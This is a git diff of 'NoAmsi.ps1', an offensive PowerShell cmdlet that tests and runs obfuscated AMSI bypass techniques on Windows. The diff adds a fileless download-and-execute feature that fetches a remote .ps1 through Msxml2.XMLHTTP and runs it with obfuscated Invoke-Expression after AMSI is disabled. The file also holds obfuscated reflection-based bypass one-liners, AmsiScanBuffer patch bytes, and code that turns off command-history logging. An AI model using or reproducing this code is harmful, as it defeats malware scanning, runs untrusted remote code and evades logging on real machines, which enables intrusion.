@@ -6,25 +6,30 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v2.3.9
+   PS cmdlet Dev version: v2.4.11
    
 .DESCRIPTION
    This cmdlet tests an internal list of amsi_bypass_technics on
    current shell or simple executes one of the bypass technics.
    This cmdlet re-uses: @_RastaMouse, @Mattifestation and @nullbyte
-   source code POC's obfuscated {by me} to evade string\runtime detection.
+   source code POC's obfuscated {by me} to evade runtime detection.
    
 .NOTES
    _Remark: The Amsi_bypasses will only work on current shell while is
    process is running. But on process close all will return to default.
    _Remark: If sellected -Action '<testall>' then this cmdlet will try
    all available bypasses and aborts at the first successfull bypass.
+   _Remark: -PayloadURL '<url>' only works with -Action 'bypass' @arg.
+   _Remark: -PayloadURL '<url>' does not use technic nº1 (PS_DOWNGRADE) 
 
 .Parameter Action
    Accepts arguments: list, testall, bypass (default: bypass)
 
 .Parameter Id
   The technic Id to use for amsi_bypass (default: 2)
+
+.Parameter PayloadURL
+  The URL script.ps1 to be downloaded\executed! (default: false)
    
 .EXAMPLE
    PS C:\> Get-Help .\NoAmsi.ps1 -full
@@ -41,6 +46,10 @@
 .EXAMPLE
    PS C:\> .\NoAmsi.ps1 -Action Bypass -Id 2
    Execute Amsi_bypass technic nº2 on current shell!
+
+.EXAMPLE
+   PS C:\> .\NoAmsi.ps1 -Action bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1"
+   Download\Execute 'GetSkype.ps1' (FileLess) trougth Ams1_bypass technic nº2 (cmdlet default technic)
 
 .INPUTS
    None. You cannot pipe objects into NoAmsi.ps1
@@ -85,29 +94,36 @@
 
 .LINK
    https://github.com/r00t-3xp10it/redpill
-   https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell   
-   https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods
 #>
 
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
+   [string]$PayloadURL="false",
    [string]$Action="Bypass",
    [int]$Id='2'
 )
 
 
 $viriato='0'#Redpill Conf
-$CmdletVersion = "v2.3.9"
+$CmdletVersion = "v2.4.11"
 ## Global cmdlet variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "@NoAmsi $CmdletVersion {SSA@RedTeam}"
 
+
+If($PayloadURL -ne "false" -and $Id -eq "1")
+{
+   $Id = "2" #Default Technic to use!
+   Write-Host "[error:] -PayloadURL '<url>' does not work with Id:1" -ForegroundColor Red -BackgroundColor Black
+   Write-Host "[syntax] Defaulting to Id:2 <DL`L_REFLEC`TION_BYPAS`S>" -ForegroundColor Yellow;Start-Sleep -Seconds 2
+}
+
 If($Action -iNotMatch '^(List|TestAll|Bypass)$')
 {
-   ## cmdlet mandatory parameter arguments checker!
+   #Cmdlet mandatory parameter arguments checker!
    Write-Host "[error] This cmdlet requires -Action '<argument>' parameter!" -ForegroundColor Red -BackgroundColor Black
    Write-Host "";Start-Sleep -Seconds 2;Get-Help .\NoAmsi.ps1 -Examples;exit ## @NoAmsi 
 }
@@ -155,6 +171,7 @@ If($Action -ieq "List")
       Write-Host "   PS C:\> .\redpill.ps1 -NoAmsi bypass -Id 2`n`n"  
    }
    exit ## Exit @NoAmsi
+   
 }
 
 
@@ -206,9 +223,16 @@ If($Action -ieq "Bypass")
                                  "PS_DOWNG`RADE_ATT`ACK",
                                  "powershell -version 2 -C Get-Host",
                                  "Powershell version 2 not found in $Env:COMPUTERNAME!")|Out-Null
+
                #Display Output Table
                $mytable|Format-List > $env:TMP\tbl.log
-               Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
+               Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
+                  Out-String -Stream | ForEach-Object {
+                     $stringformat = If($_ -Match '(failed)$'){
+                        @{ 'ForegroundColor' = 'Red';'BackgroundColor' = 'Black' } }Else{ @{ } }
+                     Write-Host @stringformat $_
+                  }
+
                #Delete artifact {logfile} left behind!
                Remove-Item -Path "$Env:TMP\tbl.log" -Force
                Remove-Item -Path "$Env:TMP\testme.log" -Force
@@ -225,9 +249,16 @@ If($Action -ieq "Bypass")
                                  "PS_DOWNG`RADE_ATT`ACK",
                                  "Execute: `"$JPGformat`"",
                                  "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null
+
                #Display Output Table
-               $mytable|Format-List > $env:TMP\tbl.log
-               Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
+               $mytable | Format-List > $env:TMP\tbl.log
+               Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
+                  Out-String -Stream | ForEach-Object {
+                     $stringformat = If($_ -Match '(success)$'){
+                        @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                     Write-Host @stringformat $_
+                  }
+
                #Delete artifact {logfile} left behind!
                Remove-Item -Path "$Env:TMP\tbl.log" -Force
                Remove-Item -Path "$Env:TMP\testme.log" -Force
@@ -271,21 +302,31 @@ If($Action -ieq "Bypass")
                               "DL`L_REFL`ECTI`ON",
                               "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
+
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
+            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
+               Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -Match '(success)$'){
+                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                  Write-Host @stringformat $_
+               }
+
+            If($PayloadURL -ieq "false")
+            {
+               #POC
+               Write-Host "Proof Of Concept - technic nº2" -ForegroundColor Yellow
+               Write-Host "-------------------------------------------"
+               Write-Host "`$MsTeamsId = `"4456625220575263174452554847`""
+               Write-Host "`$ComponentDeviceId = `"N``onP`" + `"ubl``ic`" -join ''"
+               Write-Host "`$Drawing = `"Sy@ste£.M@ana`"+`"ge£e@nt`" + `".Auto@£ati@on.`"+`"A£s@i`"+`"U@ti@ls`" -Join ''"
+               Write-Host "`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '"
+               Write-Host "`$imgForm = `$Drawing.Replace(`"@`",`"`").Replace(`"£`",`"m`");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)"
+               Write-Host "`$i0Stream = `$Bitmap.GetField(`$Graphics,`"`$ComponentDeviceId,Static`");`$i0Stream.SetValue(`$null,`$true)`n"
+            }
+
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
-
-            ## POC display
-            Write-Host "Proof Of Concept - technic nº2" -ForegroundColor Yellow
-            Write-Host "-------------------------------------------"
-            Write-Host "`$MsTeamsId = `"4456625220575263174452554847`""
-            Write-Host "`$ComponentDeviceId = `"N``onP`" + `"ubl``ic`" -join ''"
-            Write-Host "`$Drawing = `"Sy@ste£.M@ana`"+`"ge£e@nt`" + `".Auto@£ati@on.`"+`"A£s@i`"+`"U@ti@ls`" -Join ''"
-            Write-Host "`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '"
-            Write-Host "`$imgForm = `$Drawing.Replace(`"@`",`"`").Replace(`"£`",`"m`");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)"
-            Write-Host "`$i0Stream = `$Bitmap.GetField(`$Graphics,`"`$ComponentDeviceId,Static`");`$i0Stream.SetValue(`$null,`$true)`n"
          }
 
       }catch{
@@ -324,23 +365,33 @@ If($Action -ieq "Bypass")
                               "FORCE_AM`SI_ERROR",
                               "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
+
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
+            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
+               Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -Match '(success)$'){
+                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                  Write-Host @stringformat $_
+               }
+
+            If($PayloadURL -ieq "false")
+            {
+               #POC
+               Write-Host "Proof Of Concept - technic nº3" -ForegroundColor Yellow
+               Write-Host "-------------------------------------------"
+               Write-Host "`$Xdatabase = 'Utils';`$Homedrive = 'si'"
+               Write-Host "`$DiskMgr = `"Syst+@.M£n£g`"+`"e@+nt.Auto@`"+`"£tion.A`" -join ''"
+               Write-Host "`$fdx = `"@ms`"+`"£In£`"+`"tF@£`"+`"l+d`" -Join '';Start-Sleep -Milliseconds 200"
+               Write-Host "`$CleanUp = `$DiskMgr.Replace(`"@`",`"m`").Replace(`"£`",`"a`").Replace(`"+`",`"e`")"
+               Write-Host "`$Rawdata = `$fdx.Replace(`"@`",`"a`").Replace(`"£`",`"i`").Replace(`"+`",`"e`")"
+               Write-Host "`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))"
+               Write-Host "`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')"
+               Write-Host "`$Spotfix.SetValue(`$null,`$true)`n"
+            }
+
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
-
-            ## POC display
-            Write-Host "Proof Of Concept - technic nº3" -ForegroundColor Yellow
-            Write-Host "-------------------------------------------"
-            Write-Host "`$Xdatabase = 'Utils';`$Homedrive = 'si'"
-            Write-Host "`$DiskMgr = `"Syst+@.M£n£g`"+`"e@+nt.Auto@`"+`"£tion.A`" -join ''"
-            Write-Host "`$fdx = `"@ms`"+`"£In£`"+`"tF@£`"+`"l+d`" -Join '';Start-Sleep -Milliseconds 200"
-            Write-Host "`$CleanUp = `$DiskMgr.Replace(`"@`",`"m`").Replace(`"£`",`"a`").Replace(`"+`",`"e`")"
-            Write-Host "`$Rawdata = `$fdx.Replace(`"@`",`"a`").Replace(`"£`",`"i`").Replace(`"+`",`"e`")"
-            Write-Host "`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))"
-            Write-Host "`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')"
-            Write-Host "`$Spotfix.SetValue(`$null,`$true)`n"
          }
 
       }catch{
@@ -398,14 +449,26 @@ If($Action -ieq "Bypass")
                               "AM`SI_RES`ULT_CLEAN",
                               "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
+
             #Display Output Table
             $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 1
-            Remove-Item -Path "$Env:TMP\tbl.log" -Force
+            Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 1 |
+               Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -Match '(success)$'){
+                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                  Write-Host @stringformat $_
+               }
 
-            Write-Host "Proof Of Concept - technic nº4" -ForegroundColor Yellow
-            Write-Host "-------------------------------------------"
-            Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n"
+            If($PayloadURL -ieq "false")
+            {
+               #POC
+               Write-Host "Proof Of Concept - technic nº4" -ForegroundColor Yellow
+               Write-Host "-------------------------------------------"
+               Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n"
+            }
+
+            #Delete artifacts left behind
+            Remove-Item -Path "$Env:TMP\tbl.log" -Force
          }
 
       }catch{
@@ -470,7 +533,7 @@ If($Action -ieq "Bypass")
        Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
 
        If([IntPtr]::Size -eq 8) {
-	       Write-Host "[+] Process arch: 64-bits process"
+	       Write-Host "[+] Process architecture: 64-bits process"
            [byte[]]$egg = [byte[]] (
                0x4C, 0x8B, 0xDC,       # mov     r11,rsp
                0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
@@ -482,7 +545,7 @@ If($Action -ieq "Bypass")
                0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
            )
        } Else {
-	       Write-Host "[+] Process arch: 32-bits process"
+	       Write-Host "[+] Process architecture: 32-bits process"
            [byte[]]$egg = [byte[]] (
                0x8B, 0xFF,             # mov     edi,edi
                0x55,                   # push    ebp
@@ -516,15 +579,26 @@ If($Action -ieq "Bypass")
                               "AM`SI_SCANBUF`FER_PATCH",
                               "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
+
             #Dis play Output Table
             $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
+            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
+               Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -Match '(success)$'){
+                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                  Write-Host @stringformat $_
+               }
+
+            If($PayloadURL -ieq "false")
+            {
+               #POC
+               Write-Host "Proof Of Concept - technic nº5" -ForegroundColor Yellow
+               Write-Host "-------------------------------------------"
+               Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n"
+            }
+
             #Delete artifacts left behind
             Remove-Item -Path "$Env:TMP\tbl.log" -Force
-
-            Write-Host "Proof Of Concept - technic nº5" -ForegroundColor Yellow
-            Write-Host "-------------------------------------------"
-            Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n"
          }
 
       }catch{
@@ -579,6 +653,7 @@ If($Action -ieq "TestAll")
                                  "PS_DOWNG`RADE_ATT`ACK",
                                  "powershell -version 2 -C Get-Host",
                                  "Powershell version 2 not found in $Env:COMPUTERNAME")|Out-Null
+
                #Delete artifact {logfile} left behind!
                Remove-Item -Path "$Env:TMP\testme.log" -Force
             }
@@ -594,9 +669,16 @@ If($Action -ieq "TestAll")
                                  "PS_DOWNG`RADE_ATT`ACK",
                                  "Execute: `"$JPGformat`"",
                                  "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null
+
                #Display Output Table
-               $mytable|Format-List > $env:TMP\tbl.log
-               Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 2
+               $mytable | Format-List > $env:TMP\tbl.log
+               Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
+                  Out-String -Stream | ForEach-Object {
+                     $stringformat = If($_ -Match '(success)$'){
+                        @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                     Write-Host @stringformat $_
+                  }
+
                #Delete artifact {logfile} left behind!
                Remove-Item -Path "$Env:TMP\tbl.log" -Force
                Remove-Item -Path "$Env:TMP\testme.log" -Force
@@ -638,14 +720,18 @@ If($Action -ieq "TestAll")
                               "DL`L_REFL`ECTI`ON",
                               "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
+
             #Display Output Table
-            $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
-            #Delete artifacts left behind
-            Remove-Item -Path "$Env:TMP\tbl.log" -Force
-            Start-Sleep -Milliseconds 680
+            $mytable | Format-List > $env:TMP\tbl.log
+            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
+               Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -Match '(success)$'){
+                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                  Write-Host @stringformat $_
+               }
 
             ## POC display
+            Start-Sleep -Milliseconds 680
             Write-Host "Proof Of Concept - technic nº2" -ForegroundColor Yellow
             Write-Host "-------------------------------------------"
             Write-Host "`$MsTeamsId = `"4456625220575263174452554847`""
@@ -654,6 +740,9 @@ If($Action -ieq "TestAll")
             Write-Host "`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '"
             Write-Host "`$imgForm = `$Drawing.Replace(`"@`",`"`").Replace(`"£`",`"m`");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)"
             Write-Host "`$i0Stream = `$Bitmap.GetField(`$Graphics,`"`$ComponentDeviceId,Static`");`$i0Stream.SetValue(`$null,`$true)`n"
+
+            #Delete artifacts left behind
+            Remove-Item -Path "$Env:TMP\tbl.log" -Force
             #success exec = exit
             exit
          }
@@ -690,14 +779,18 @@ If($Action -ieq "TestAll")
                               "FORCE_AM`SI_ERROR",
                               "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
-            #Display Output Table
-            $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
-            #Delete artifacts left behind
-            Remove-Item -Path "$Env:TMP\tbl.log" -Force
-            Start-Sleep -Milliseconds 680
 
-            ## POC display
+            #Display Output Table
+            $mytable | Format-List > $env:TMP\tbl.log
+            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
+               Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -Match '(success)$'){
+                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                  Write-Host @stringformat $_
+               }
+
+            #POC
+            Start-Sleep -Milliseconds 680
             Write-Host "Proof Of Concept - technic nº3" -ForegroundColor Yellow
             Write-Host "-------------------------------------------"
             Write-Host "`$Xdatabase = 'Utils';`$Homedrive = 'si'"
@@ -708,6 +801,9 @@ If($Action -ieq "TestAll")
             Write-Host "`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))"
             Write-Host "`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')"
             Write-Host "`$Spotfix.SetValue(`$null,`$true)`n"
+
+            #Delete artifacts left behind
+            Remove-Item -Path "$Env:TMP\tbl.log" -Force
             #success exec = exit
             exit
          }
@@ -763,15 +859,24 @@ If($Action -ieq "TestAll")
                               "AM`SI_RES`ULT_CLEAN",
                               "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
-            #Display Output Table
-            $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$env:TMP\tbl.log"|Select-Object -Skip 1
-            Remove-Item -Path "$Env:TMP\tbl.log" -Force
-            Start-Sleep -Milliseconds 680
 
+            #Display Output Table
+            $mytable | Format-List > $env:TMP\tbl.log
+            Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 1 |
+               Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -Match '(success)$'){
+                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                  Write-Host @stringformat $_
+               }
+
+            #POC
+            Start-Sleep -Milliseconds 680
             Write-Host "Proof Of Concept - technic nº4" -ForegroundColor Yellow
             Write-Host "-------------------------------------------"
             Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n"
+
+            #Delete artifacts left behind
+            Remove-Item -Path "$Env:TMP\tbl.log" -Force
             #success exec = exit
             exit
          }
@@ -834,7 +939,7 @@ If($Action -ieq "TestAll")
        Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
 
        If([IntPtr]::Size -eq 8) {
-	       Write-Host "[+] Process arch: 64-bits process"
+	       Write-Host "[+] Process architecture: 64-bits process"
            [byte[]]$egg = [byte[]] (
                0x4C, 0x8B, 0xDC,       # mov     r11,rsp
                0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
@@ -846,7 +951,7 @@ If($Action -ieq "TestAll")
                0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
            )
        } Else {
-	       Write-Host "[+] Process arch: 32-bits process"
+	       Write-Host "[+] Process architecture: 32-bits process"
            [byte[]]$egg = [byte[]] (
                0x8B, 0xFF,             # mov     edi,edi
                0x55,                   # push    ebp
@@ -880,16 +985,24 @@ If($Action -ieq "TestAll")
                               "AM`SI_SCANBUFF`ER_PATCH",
                               "Execute: `"$JPGformat`"",
                               "string detection bypassed!")|Out-Null
-            #Display Output Table
-            $mytable|Format-List > $env:TMP\tbl.log
-            Get-Content -Path "$Env:TMP\tbl.log"|Select-Object -Skip 2
-            #Delete artifacts left behind
-            Remove-Item -Path "$Env:TMP\tbl.log" -Force
-            Start-Sleep -Milliseconds 680
 
+            #Display Output Table
+            $mytable | Format-List > $env:TMP\tbl.log
+            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
+               Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -Match '(success)$'){
+                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
+                  Write-Host @stringformat $_
+               }
+
+            #POC
+            Start-Sleep -Milliseconds 680
             Write-Host "Proof Of Concept - technic nº5" -ForegroundColor Yellow
             Write-Host "-------------------------------------------"
             Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n"
+
+            #Delete artifacts left behind
+            Remove-Item -Path "$Env:TMP\tbl.log" -Force
          }
 
       }catch{
@@ -897,4 +1010,50 @@ If($Action -ieq "TestAll")
          Write-Host "`n"
       }
 
+}
+
+
+If($PayloadURL -ne "false")
+{
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Download\Execute URL script.ps1 trougth AMS1_bypass!
+   #>
+
+   #Parse URL data
+   $RawName = ($PayloadURL.Split('/')[-1]) -replace '.ps1',''
+   Write-Host "Download\Execute $RawName" -ForegroundColor Yellow
+   Write-Host "-------------------------" 
+ 
+
+   If($PayloadURL -iNotMatch '^[http(s)://]')
+   {
+      #Wrong download fileformat syntax user input
+      Write-Host "[error] -PayloadURL '<url>' requires http(s) url format!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "";Start-Sleep -Seconds 2;exit ## @NoAmsi    
+   }
+   
+   If($PayloadURL -iNotMatch '(.ps1)$')
+   {
+      #Wrong download fileformat syntax user input
+      Write-Host "[error] -PayloadURL '<url>' only accepts script.PS1 file formats!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "";Start-Sleep -Seconds 2;exit ## @NoAmsi    
+   }   
+
+   #Msxml2-Proxy-Downloader { FileLess }
+   $TORnetwork=New-Object -ComObject Msxml2.XMLHTTP;$TORnetwork.open('GET',"$PayloadURL",$false);$TORnetwork.send();i`ex $TORnetwork.responseText
+   Start-Sleep -Seconds 1 ## Give some time for ps1 to load proper!
+   If(Get-Module -ListAvailable -Name $RawName)
+   {
+      &"$RawName"
+      Write-Host ""
+   } 
+   Else
+   {
+      Write-Host "[error] fail to load $RawName into PS database!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host ""
+   }
+                       
 }
